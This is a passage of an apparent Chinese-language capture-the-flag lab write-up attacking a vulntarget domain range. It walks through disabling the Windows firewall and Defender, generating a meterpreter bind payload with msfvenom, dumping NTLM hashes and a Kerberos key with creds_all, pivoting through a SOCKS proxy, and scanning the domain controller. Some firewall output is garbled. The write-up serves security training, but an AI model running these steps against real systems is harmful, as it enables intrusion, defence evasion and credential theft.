style="color:#393A34"><span class="token plain">MaxFileSize                           4096</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ר�������ļ� ����:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">״̬                                  ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">����ǽ����                          BlockInbound,AllowOutbound</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalFirewallRules                    N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalConSecRules                      N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InboundUserNotification               ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RemoteManagement                      ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UnicastResponseToMulticast            ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">��־:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogAllowedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogDroppedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MaxFileSize                           4096</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">���������ļ� ����:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">״̬                                  ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">����ǽ����                          BlockInbound,AllowOutbound</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalFirewallRules                    N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalConSecRules                      N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InboundUserNotification               ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RemoteManagement                      ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UnicastResponseToMulticast            ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">��־:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogAllowedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogDroppedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MaxFileSize                           4096</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ȷ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\phpStudy\PHPTutorial\WWW&gt; chcp 65001</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Active code page: 65001</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\phpStudy\PHPTutorial\WWW&gt; netsh advfirewall show allprofiles</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">�������ļ� ����:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">״̬                                  ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">����ǽ����                          BlockInbound,AllowOutbound</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalFirewallRules                    N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalConSecRules                      N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InboundUserNotification               ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RemoteManagement                      ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UnicastResponseToMulticast            ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">��־:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogAllowedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogDroppedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MaxFileSize                           4096</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ר�������ļ� ����:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">״̬                                  ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">����ǽ����                          BlockInbound,AllowOutbound</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalFirewallRules                    N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalConSecRules                      N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InboundUserNotification               ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RemoteManagement                      ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UnicastResponseToMulticast            ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">��־:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogAllowedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogDroppedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MaxFileSize                           4096</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">���������ļ� ����:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">״̬                                  ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">����ǽ����                          BlockInbound,AllowOutbound</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalFirewallRules                    N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalConSecRules                      N/A (�� GPO �洢)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InboundUserNotification               ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RemoteManagement                      ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UnicastResponseToMulticast            ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">��־:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogAllowedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LogDroppedConnections                 ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MaxFileSize                           4096</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ȷ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\phpStudy\PHPTutorial\WWW&gt; netsh advfirewall set allprofiles state off</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ȷ����</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\phpStudy\PHPTutorial\WWW&gt; gpupdate /force</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后基于当前 <code>nt authority\system</code> 的用户权限，直接注册表关闭 <code>Defender</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\phpStudy\PHPTutorial\WWW&gt; REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">操作成功完成。</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>关闭 <code>Defender</code> 之后，就可以使用蚁剑进行文件管理等操作</p>
<p>但是经过多次尝试，反向马无法连接，于是尝试构建正向马</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=4444 -f exe &gt; 4444.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No arch selected, selecting arch: x64 from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 496 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of exe file: 7168 bytes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20241124-112410-5f142cad7482e6291f43265f839e2e97.png" width="1853" height="1095" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="域信息收集">域信息收集<a href="#域信息收集" class="hash-link" aria-label="域信息收集的直接链接" title="域信息收集的直接链接">​</a></h2>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">win7 192.168.200.10 | 10.0.20.98</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; arp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ARP cache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">=========</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IP address       MAC address        Interface</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ----------       -----------        ---------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    10.0.20.99       00:0c:29:49:db:32  Intel(R) PRO/1000 MT Network Connection #2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    10.0.20.255      ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection #2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    192.168.200.0    00:50:56:eb:cc:78  Intel(R) PRO/1000 MT Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    192.168.200.1    00:50:56:c0:00:00  Intel(R) PRO/1000 MT Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    192.168.200.129  00:0c:29:07:06:1a  Intel(R) PRO/1000 MT Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    192.168.200.254  00:50:56:fb:ab:25  Intel(R) PRO/1000 MT Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    192.168.200.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    224.0.0.22       00:00:00:00:00:00  Software Loopback Interface 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Network Connection #2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    224.0.0.22       01:00:5e:00:00:16  Bluetooth ����(����������)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Network Connection #2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    239.255.255.250  00:00:00:00:00:00  Software Loopback Interface 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    239.255.255.250  01:00:5e:7f:ff:fa  Intel(R) PRO/1000 MT Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Network Connection</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">win2016 10.0.20.99 | 10.0.10.111</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; arp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ARP cache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">=========</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    IP address       MAC address        Interface</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ----------       -----------        ---------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    10.0.10.110      00:0c:29:96:86:43  Intel(R) 82574L Gigabit Network Connection #2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    10.0.10.255      ff:ff:ff:ff:ff:ff  Intel(R) 82574L Gigabit Network Connection #2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    10.0.20.1        00:50:56:c0:00:12  Intel(R) 82574L Gigabit Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    10.0.20.98       00:0c:29:b3:db:12  Intel(R) 82574L Gigabit Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    10.0.20.255      ff:ff:ff:ff:ff:ff  Intel(R) 82574L Gigabit Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    224.0.0.22       00:00:00:00:00:00  Software Loopback Interface 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    224.0.0.22       01:00:5e:00:00:16  Intel(R) 82574L Gigabit Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    224.0.0.22       01:00:5e:00:00:16  Intel(R) 82574L Gigabit Network Connection #2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    224.0.0.252      01:00:5e:00:00:fc  Intel(R) 82574L Gigabit Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    224.0.0.252      01:00:5e:00:00:fc  Intel(R) 82574L Gigabit Network Connection #2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    239.255.255.250  00:00:00:00:00:00  Software Loopback Interface 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    239.255.255.250  01:00:5e:7f:ff:fa  Intel(R) 82574L Gigabit Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    239.255.255.250  01:00:5e:7f:ff:fa  Intel(R) 82574L Gigabit Network Connection #2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在 <code>win2016</code> 上探测到域信息</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">win2016 10.0.20.99 | 10.0.10.111</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; run post/windows/gather/enum_domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Domain FQDN: vulntarget.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Domain NetBIOS Name: VULNTARGET</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Domain Controller: win2019.vulntarget.com (IP: 10.0.10.110)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; creds_all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Running as SYSTEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Retrieving all credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msv credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">===============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username       Domain      NTLM                              SHA1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------       ------      ----                              ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator  WIN2016     570a9a65db8fba761c1008a51d4c95ab  759e689a07a84246d0b202a80f5fd9e335ca5392</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN2016$       VULNTARGET  2b6d27b1fbbad9f1e6413f972dec61ef  59e545714c05fb9b1a65fb79374a7c3dbbed25cf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wdigest credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">===================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username       Domain      Password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------       ------      --------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(null)         (null)      (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator  WIN2016     (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN2016$       VULNTARGET  (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kerberos credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">====================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username       Domain          Password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------       ------          --------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(null)         (null)          (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator  WIN2016         (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WIN2016$       vulntarget.com  9f 4a d8 69 51 87 85 85 8f 09 7c 82 f2 18 39 f6 c9 0e 07 3c 47 dc 95 a6 31 a8 42 6d af 98 49 5f e8 53 1c 4c 57 a5 d5 71 c5 4c f2 28 f4 fd 52 70 ed 6f da 35 e7 82 fd 46 6e 53 a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               c ef b1 cf 71 a7 cc f2 ff 4d bc 08 0f ee f6 e1 ac a5 8f 4f b6 a7 ae 3e e0 44 d6 79 bc ee e9 ea a9 17 c4 d5 58 78 06 43 ca 6c 73 3c d2 30 07 20 1d 2e 12 96 34 a4 a3 b7 42 ba be</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                1d 84 b4 5d 32 d9 cf 39 f0 3e a4 79 2d 00 8b 62 6a 6b f3 3e c8 f7 ad 78 be 51 04 7b 30 fe eb e5 12 af 14 49 cb 50 63 68 97 01 29 9b 6e 4d 02 1b 7f be 13 f1 ea 92 26 c6 65 f2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               0c fa 70 9f b3 42 ae 94 9b 0c 35 77 2c 4b 54 1d 81 3c dd 0f 5c 15 04 0f fd aa b1 e5 62 0a 74 ca 84 2f 80 92 c2 59 b4 af 02 99 bb eb 95 99 d3 1b 59 4c c8 6e bd 75 be 0c 9d f9 a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               1 30 3e 85 7c 49 86</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">win2016$       VULNTARGET.COM  (null)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这与 ARP 表得到的信息吻合</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="建立二层内网代理">建立二层内网代理<a href="#建立二层内网代理" class="hash-link" aria-label="建立二层内网代理的直接链接" title="建立二层内网代理的直接链接">​</a></h2>
<p>在 Meterpreter 中添加路由，并建立代理</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">win2016 10.0.20.99 | 10.0.10.111</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; run post/multi/manage/autoroute</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Running module against WIN2016</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Searching for subnets to autoroute.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Route added to subnet 10.0.10.0/255.255.255.0 from host&#x27;s routing table.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Route added to subnet 10.0.20.0/255.255.255.0 from host&#x27;s routing table.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; bg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxy</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 auxiliary(server/socks_proxy) &gt; exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Auxiliary module running as background job 0.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Starting the SOCKS proxy server</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="win2019-侦察">win2019 侦察<a href="#win2019-侦察" class="hash-link" aria-label="win2019 侦察的直接链接" title="win2019 侦察的直接链接">​</a></h2>
<p>扫描 <code>win2019</code> 开放的端口</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ proxychains ./tools/fscan-1.8.4/fscan -h 10.0.10.110</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start infoscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.10.110:139 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.10.110:135 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.10.110:445 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.0.10.110:88 open</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] alive ports len is: 4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] NetInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*]10.0.10.110</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]win2019</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   [-&gt;]10.0.10.110</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] NetBios 10.0.10.110     [+] DC:VULNTARGET\WIN2019</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">已完成 4/4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] 扫描结束, 耗时: 3.072107126s</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" 